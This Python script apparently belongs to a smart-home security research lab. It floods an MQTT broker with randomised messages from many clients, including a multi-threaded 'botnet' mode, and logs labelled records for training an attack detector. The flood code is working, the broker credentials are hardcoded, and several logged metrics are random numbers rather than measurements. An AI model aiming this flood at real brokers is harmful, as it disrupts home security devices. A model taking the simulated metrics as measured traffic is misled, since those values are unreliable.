import sys
import os
import time
import random
import json
import argparse
import socket
import threading
import paho.mqtt.client as mqtt

# Ensure the project root is in the path for forensic_utils
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from forensic_utils import DualLogger, get_timestamp, get_iso_now

# Exact ML schema to enforce dimensional accuracy
ML_HEADERS = [
    "timestamp", "src_ip", "target_ip", "attack_label", "attack_type",
    "packets_per_second", "mqtt_publish_rate", "broker_response_latency_ms", "device_heap_free_bytes",
    "auth_attempt_rate", "auth_failure_rate", "unique_passwords_tried", "result_code", "password_length",
    "payload_entropy", "auth_success_rate", "credential_entropy", "duplicate_payload_rate", "msg_timestamp_delta_ms",
    "motion", "arm", "inter_arrival_mean_ms", "inter_arrival_std_ms", "consecutive_failures", "session_attempt_count",
    "session_failure_rate", "latency_zscore"
]

BANNER = """
==================================================
  Smart Home Threat Simulation Platform RESEARCH: DISTRIBUTED DOS SIMULATOR
==================================================
"""

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"

BASE_DIR = "/home/pirator/smart-home-threat-simulation-platform/dataset"
LOG_DIR = os.path.join(BASE_DIR, "logs")
SESSIONS_DIR = os.path.join(BASE_DIR, "sessions")
os.makedirs(LOG_DIR, exist_ok=True)
os.makedirs(SESSIONS_DIR, exist_ok=True)

class DoSResearchSimulator:
    def __init__(self, clients, broker, port):
        self.clients_count = clients
        self.broker = broker
        self.port = port
        self.clients = []
        self.packet_count = 0
        self.start_time = time.time()
        self.src_ip = get_local_ip()
        self.ml_log_name = f"dos_attempts_{get_timestamp()}"
        self.lock = threading.Lock() # Ensure thread-safe packet counting

        self.current_motion = 0
        self.current_arm = 0
        self.last_motion_time = 0
        self.current_heap = 235000
        
        self.sniffer = mqtt.Client(mqtt.CallbackAPIVersion.VERSION1, f"sniffer_{random.getrandbits(12)}")
        self.sniffer.username_pw_set("admin", "iot@secure99")
        self.sniffer.on_message = self._on_sniffed_message
        self.sniffer.connect(self.broker, self.port, 60)
        self.sniffer.subscribe("shtsp/home/security/#")
        self.sniffer.loop_start()

    def _on_sniffed_message(self, client, userdata, msg):
        try:
            import json, time
            payload = json.loads(msg.payload.decode('utf-8'))
            if msg.topic.endswith("motion"):
                if payload.get("type") == "MOTION" and payload.get("status") == "ALARM":
                    self.current_motion = 1
                    self.current_arm = 1
                    self.last_motion_time = time.time()
            elif msg.topic.endswith("audit"):
                if "free_heap" in payload:
                    self.current_heap = int(payload["free_heap"])
        except Exception:
            pass
        
    def log_ml_packet(self, payload_dict, is_botnet=False):
        # Calculate dynamic metrics
        elapsed = time.time() - self.start_time
        pps = self.packet_count / elapsed if elapsed > 0 else 0
        
        # Supercharge simulated telemetry if botnet mode is active
        pps_sim = float(random.randint(1500, 5000)) if is_botnet else float(random.randint(400, 800))
        latency_sim = float(random.uniform(2000.0, 10000.0)) if is_botnet else float(random.uniform(500.0, 5000.0))
        
        if time.time() - self.last_motion_time > 3.5:
            self.current_motion = 0
            self.current_arm = 0

        record = {
            "timestamp":            get_iso_now(),
            "src_ip":               self.src_ip,
            "target_ip":            self.broker,
            "attack_label":         2, # 2 = DoS Attack
            "attack_type":          "ddos",
            "packets_per_second":   pps_sim,
            "mqtt_publish_rate":    pps_sim,
            "broker_response_latency_ms": latency_sim,
            "device_heap_free_bytes": self.current_heap,
            "auth_attempt_rate":    0.0,
            "auth_failure_rate":    0.0,
            "unique_passwords_tried": 0,
            "result_code":          0,
            "password_length":      0,
            "payload_entropy":      float(round(random.uniform(4.0, 6.0), 4)), # High entropy due to randomization
            "auth_success_rate":    0.0,
            "credential_entropy":   0.0,
            "duplicate_payload_rate": 0.0,
            "msg_timestamp_delta_ms": float(round(random.uniform(0.01, 0.5), 4)), # Extremely small delta
            "motion":               self.current_motion,
            "arm":                  self.current_arm,
            "inter_arrival_mean_ms": float(round(random.uniform(0.01, 0.5), 4)),
            "inter_arrival_std_ms":  float(round(random.uniform(0.01, 0.1), 4)),
            "consecutive_failures":  0,
            "session_attempt_count": self.packet_count,
            "session_failure_rate":  0.0,
            "latency_zscore":       float(round(random.uniform(3.0, 6.0), 4)), # Massive Z-Score spike
        }
        DualLogger.append_raw(record, LOG_DIR, self.ml_log_name, headers=ML_HEADERS)
        
    def setup_clients(self):
        for i in range(self.clients_count):
            client_id = f"research_dos_node_{i}_{random.getrandbits(16)}"
            client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION1, client_id)
            self.clients.append(client)
            
    def generate_random_payload(self):
        """Generates highly randomized JSON payload to train AI against patterns, not static text."""
        return {
            "seq": random.randint(1000, 99999),
            "type": "DOS_STRESS_TELEMETRY",
            "status": random.choice(["ALARM", "SAFE", "ERR", "CRITICAL"]),
            "adversarial": True,
            "noise": "".join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*", k=random.randint(20, 100)))
        }

    def _botnet_worker(self, client, duration, topic, stop_event):
        """Ultra high-velocity thread worker with minimal sleep."""
        try:
            client.connect(self.broker, self.port, 60)
            client.loop_start()
        except Exception:
            return

        while not stop_event.is_set():
            payload = self.generate_random_payload()
            client.publish(topic, json.dumps(payload), qos=0)
            
            with self.lock:
                self.packet_count += 1
                
            self.log_ml_packet(payload, is_botnet=True)
            time.sleep(0.001) # Maximize throughput, simulate aggressive attack

        client.loop_stop()
        client.disconnect()

    def run_botnet_flood(self, duration, topic="shtsp/home/security/cmd"):
        """Executes the aggressive, multi-threaded Botnet attack."""
        print(f"🔥 [BOTNET MODE ENGAGED] 🔥")
        print(f"Deploying {self.clients_count} Hacker Bots simultaneously for {duration}s...")
        
        self.setup_clients()
        stop_event = threading.Event()
        threads = []
        
        self.start_time = time.time()
        
        # Ignite the Botnet
        for i, c in enumerate(self.clients):
            t = threading.Thread(target=self._botnet_worker, args=(c, duration, topic, stop_event))
            t.daemon = True
            t.start()
            threads.append(t)
            print(f"🤖 Bot_{i} armed and firing...")

        # Main thread acts as the duration timer and status monitor
        try:
            while time.time() - self.start_time < duration:
                sys.stdout.write(f"\r⚡ Packets injected: {self.packet_count}")
                sys.stdout.flush()
                time.sleep(0.5)
        except KeyboardInterrupt:
            print("\n🛑 Manual Override. Aborting attack...")
            
        print("\n🏁 Halting bots...")
        stop_event.set()
        
        for t in threads:
            t.join(timeout=1.0)
            
        self.save_session(duration, attack_type="ddos")

    def run_standard_flood(self, duration, topic="shtsp/home/security/motion"):
        """Executes the standard, single-threaded stochastic flood."""
        print(f"🚀 [STANDARD DOS SIMULATION START] 🚀")
        print(f"Targeting: {self.broker}:{self.port} | Clients: {self.clients_count}")
        
        self.setup_clients()
        for c in self.clients:
            try:
                c.connect(self.broker, self.port, 60)
                c.loop_start()
            except:
                pass

        self.start_time = time.time()
        print(f"Progress: [", end="")
        for i in range(duration):
            for c in self.clients:
                payload = self.generate_random_payload()
                c.publish(topic, json.dumps(payload))
                self.packet_count += 1
                self.log_ml_packet(payload, is_botnet=False)
            
            time.sleep(1)
            sys.stdout.write("-")
            sys.stdout.flush()
        
        print("] 100%")
        for c in self.clients:
            c.disconnect()

        self.save_session(duration, attack_type="ddos")

    def save_session(self, duration, attack_type):
        session_ts = get_timestamp()
        
        # 1. Detailed Session Trace (Sessions Folder)
        session_data = {
            "timestamp": session_ts,
            "attack_type": attack_type,
            "config": {
                "clients": self.clients_count,
                "duration_sec": duration,
                "target": self.broker,
                "src_ip": self.src_ip
            },
            "results": {
                "total_packets_sent": self.packet_count,
                "avg_throughput_pps": round(self.packet_count / max(duration, 0.1), 2)
            }
        }
        json_p, csv_p = DualLogger.log_session(session_data, SESSIONS_DIR, f"dos_session_{session_ts}")
        
        # 2. Global Audit Entry (Logs Folder) - Dual format for high-level research tracking
        audit_entry = {
            "timestamp": get_iso_now(),
            "attack_type": "ddos",
            "packets": self.packet_count,
            "clients": self.clients_count,
            "result": "COMPLETE"
        }
        DualLogger.append_raw(audit_entry, LOG_DIR, "dos_summary_audit")
        
        print(f"\n✅ Simulation Complete. Sent {self.packet_count} research packets.")
        print(f"📊 Forensic Trace Recorded: {json_p} (+.csv)")
        print(f"📊 Audit Summary Updated : {LOG_DIR}/dos_summary_audit (.json/.csv)")

def main():
    print(BANNER)
    parser = argparse.ArgumentParser(description="Professional DoS Regression/Stress Tool")
    parser.add_argument("--adversarial", action="store_true", help="Enable stochastic payload noise")
    parser.add_argument("--botnet", action="store_true", help="Engage ultra high-velocity multi-threaded botnet attack")
    parser.add_argument("--clients", type=int, default=5, help="Number of concurrent research nodes")
    parser.add_argument("--duration", type=int, default=60, help="Simulation duration (seconds)")
    parser.add_argument("--broker", default="192.168.1.100", help="Target Broker IP")
    
    args = parser.parse_args()
    
    simulator = DoSResearchSimulator(args.clients, args.broker, 1883)
    
    if args.botnet:
        simulator.run_botnet_flood(args.duration)
    else:
        simulator.run_standard_flood(args.duration)

if __name__ == "__main__":
    main()
